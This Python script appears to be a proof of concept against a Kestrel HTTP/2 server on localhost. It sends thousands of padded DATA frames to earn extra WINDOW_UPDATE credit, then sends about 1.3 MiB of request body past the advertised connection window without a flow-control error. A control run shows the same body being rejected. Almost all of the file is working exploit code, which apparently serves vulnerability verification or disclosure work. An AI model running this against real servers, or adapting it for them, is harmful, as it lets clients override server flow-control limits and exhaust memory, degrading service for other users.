#!/usr/bin/env python3
"""Paired loopback proof for padded-DATA input flow-control inflation."""

from __future__ import annotations

import select
import socket
import struct
import time

HOST = "127.0.0.1"
PORT = 5001
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_SETTINGS = 0x4
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
FLAG_PADDED = 0x8
FLOW_CONTROL_ERROR = 0x3
DEFAULT_STREAM_WINDOW = 768 * 1024
DEFAULT_CONNECTION_WINDOW = 1024 * 1024
PADDING_LENGTH = 255
PADDING_PAYLOAD = bytes((PADDING_LENGTH,)) + (b"P" * PADDING_LENGTH)
PADDING_FRAMES = 8192  # 2 MiB of flow-controlled padding, no app-visible data.
BODY_PER_STREAM = 448 * 1024
BODY_STREAMS = (3, 5, 7)
PING_PAYLOAD = b"PADFLOW!"


def frame(frame_type: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
    if len(payload) > 0xFFFFFF:
        raise ValueError("payload too large")
    return len(payload).to_bytes(3, "big") + bytes((frame_type, flags)) + struct.pack(
        "!I", stream_id & 0x7FFFFFFF
    ) + payload


def recv_exact(sock: socket.socket, length: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < length:
        try:
            chunk = sock.recv(length - len(chunks))
        except ConnectionResetError as error:
            raise EOFError(f"connection reset after {len(chunks)}/{length} bytes") from error
        if not chunk:
            raise EOFError(f"EOF after {len(chunks)}/{length} bytes")
        chunks.extend(chunk)
    return bytes(chunks)


def recv_frame(sock: socket.socket) -> tuple[int, int, int, bytes]:
    header = recv_exact(sock, 9)
    length = int.from_bytes(header[:3], "big")
    frame_type = header[3]
    flags = header[4]
    stream_id = struct.unpack("!I", header[5:])[0] & 0x7FFFFFFF
    return frame_type, flags, stream_id, recv_exact(sock, length)


def literal(value: bytes) -> bytes:
    if len(value) >= 127:
        raise ValueError("short literal required")
    return bytes((len(value),)) + value


def request_headers(path: bytes) -> bytes:
    authority = f"{HOST}:{PORT}".encode("ascii")
    # Indexed :method POST and :scheme http; literal-without-indexing :path
    # using static name index 4; literal-without-indexing :authority index 1.
    return b"\x83\x86\x04" + literal(path) + b"\x01" + literal(authority)


def parse_settings(payload: bytes) -> dict[int, int]:
    if len(payload) % 6:
        return {}
    return {
        struct.unpack("!H", payload[offset : offset + 2])[0]: struct.unpack(
            "!I", payload[offset + 2 : offset + 6]
        )[0]
        for offset in range(0, len(payload), 6)
    }


def connect() -> tuple[socket.socket, int, int, list[tuple[int, int, int, bytes]]]:
    sock = socket.create_connection((HOST, PORT), timeout=5)
    sock.sendall(PREFACE + frame(FRAME_SETTINGS, 0, 0))
    initial_stream_window = 65_535
    initial_connection_window = 65_535
    startup_frames = []

    while True:
        item = recv_frame(sock)
        startup_frames.append(item)
        frame_type, flags, stream_id, payload = item
        if frame_type == FRAME_SETTINGS and not flags & FLAG_ACK:
            settings = parse_settings(payload)
            initial_stream_window = settings.get(4, initial_stream_window)
            sock.sendall(frame(FRAME_SETTINGS, FLAG_ACK, 0))
        elif frame_type == FRAME_WINDOW_UPDATE and stream_id == 0 and len(payload) == 4:
            initial_connection_window += struct.unpack("!I", payload)[0] & 0x7FFFFFFF

        if any(item[0] == FRAME_SETTINGS and not item[1] & FLAG_ACK for item in startup_frames):
            # Kestrel writes its non-protocol settings and initial connection
            # WINDOW_UPDATE together. Give the latter a moment to arrive.
            readable, _, _ = select.select([sock], [], [], 0.05)
            if not readable:
                break

    return sock, initial_stream_window, initial_connection_window, startup_frames


def open_hold_streams(sock: socket.socket) -> None:
    block = request_headers(b"/hold")
    for stream_id in (1, *BODY_STREAMS):
        sock.sendall(frame(FRAME_HEADERS, FLAG_END_HEADERS, stream_id, block))


def drain_available(
    sock: socket.socket, timeout: float = 0.05
) -> list[tuple[int, int, int, bytes]]:
    items = []
    while select.select([sock], [], [], timeout)[0]:
        try:
            items.append(recv_frame(sock))
        except (EOFError, ConnectionResetError, OSError):
            break
        timeout = 0.0
    return items


def goaway_error(items: list[tuple[int, int, int, bytes]]) -> int | None:
    for frame_type, _flags, _stream_id, payload in items:
        if frame_type == FRAME_GOAWAY and len(payload) >= 8:
            return struct.unpack("!I", payload[4:8])[0]
    return None


def send_body(sock: socket.socket) -> tuple[int, Exception | None]:
    sent = 0
    error = None
    chunk = b"B" * 16_384
    try:
        for stream_id in BODY_STREAMS:
            remaining = BODY_PER_STREAM
            while remaining:
                part = chunk[: min(remaining, len(chunk))]
                sock.sendall(frame(FRAME_DATA, 0, stream_id, part))
                sent += len(part)
                remaining -= len(part)
    except (BrokenPipeError, ConnectionResetError, OSError) as exc:
        error = exc
    return sent, error


def run_control() -> dict[str, object]:
    sock, stream_window, connection_window, startup = connect()
    open_hold_streams(sock)
    sent, send_error = send_body(sock)
    time.sleep(0.2)
    received = startup + drain_available(sock, 1.0)
    error = goaway_error(received)
    sock.close()
    return {
        "stream_window": stream_window,
        "connection_window": connection_window,
        "body_sent": sent,
        "send_error": type(send_error).__name__ if send_error else None,
        "goaway_error": error,
        "flow_control_rejected": error == FLOW_CONTROL_ERROR,
    }


def prime_with_padding(sock: socket.socket) -> tuple[int, int, list[tuple[int, int, int, bytes]]]:
    updates = []
    payload_bytes = 0
    for index in range(PADDING_FRAMES):
        sock.sendall(frame(FRAME_DATA, FLAG_PADDED, 1, PADDING_PAYLOAD))
        payload_bytes += len(PADDING_PAYLOAD)
        # Stay beneath the default stream window while waiting for Kestrel's
        # padding WINDOW_UPDATEs. This keeps the priming phase protocol-valid.
        if (index + 1) % 1537 == 0:
            updates.extend(drain_available(sock, 0.5))
    updates.extend(drain_available(sock, 0.5))
    update_credit = 0
    for frame_type, _flags, _stream_id, payload in updates:
        if frame_type == FRAME_WINDOW_UPDATE and len(payload) == 4:
            update_credit += struct.unpack("!I", payload)[0] & 0x7FFFFFFF
    return payload_bytes, update_credit, updates


def run_candidate() -> dict[str, object]:
    sock, stream_window, connection_window, startup = connect()
    open_hold_streams(sock)
    padding_bytes, update_credit, padding_frames = prime_with_padding(sock)
    sent, send_error = send_body(sock)

    try:
        sock.sendall(frame(FRAME_PING, 0, 0, PING_PAYLOAD))
    except (BrokenPipeError, ConnectionResetError, OSError) as exc:
        send_error = send_error or exc

    observed = startup + padding_frames
    deadline = time.monotonic() + 2.0
    ping_ack = False
    while time.monotonic() < deadline:
        readable, _, _ = select.select([sock], [], [], deadline - time.monotonic())
        if not readable:
            break
        try:
            item = recv_frame(sock)
        except (EOFError, ConnectionResetError, OSError):
            break
        observed.append(item)
        if item[0] == FRAME_PING and item[1] & FLAG_ACK and item[3] == PING_PAYLOAD:
            ping_ack = True
            break

    error = goaway_error(observed)
    sock.close()
    return {
        "stream_window": stream_window,
        "connection_window": connection_window,
        "padding_payload_bytes": padding_bytes,
        "window_update_credit_both_levels": update_credit,
        "body_sent": sent,
        "send_error": type(send_error).__name__ if send_error else None,
        "goaway_error": error,
        "ping_ack": ping_ack,
        "flow_control_bypass": sent > connection_window and error is None and ping_ack,
    }


def main() -> int:
    control = run_control()
    candidate = run_candidate()
    print(f"expected_default_stream_window={DEFAULT_STREAM_WINDOW}")
    print(f"expected_default_connection_window={DEFAULT_CONNECTION_WINDOW}")
    print(f"aggregate_body_bytes={BODY_PER_STREAM * len(BODY_STREAMS)}")
    print(f"control={control}")
    print(f"candidate={candidate}")
    passed = bool(control["flow_control_rejected"] and candidate["flow_control_bypass"])
    print(f"paired_padding_flow_control_bypass={passed}")
    return 0 if passed else 1


if __name__ == "__main__":
    raise SystemExit(main())
